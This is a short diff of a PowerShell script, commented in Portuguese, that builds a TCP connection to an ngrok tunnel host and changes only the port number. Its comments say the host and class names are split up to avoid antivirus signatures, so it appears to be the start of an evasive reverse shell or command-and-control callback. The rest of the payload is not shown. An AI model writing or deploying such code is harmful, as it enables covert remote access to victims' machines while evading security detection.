@@ -1,6 +1,6 @@
 # Define o alvo e porta de forma dividida para evitar assinatura
 $h = ('0' + '.tcp.sa.ngrok.io')
-$p = 12244
+$p = 17512
 
 # Cria o socket TCP
 $c = New-Object ("System" + ".Net.Sockets.TCPClient") $h, $p
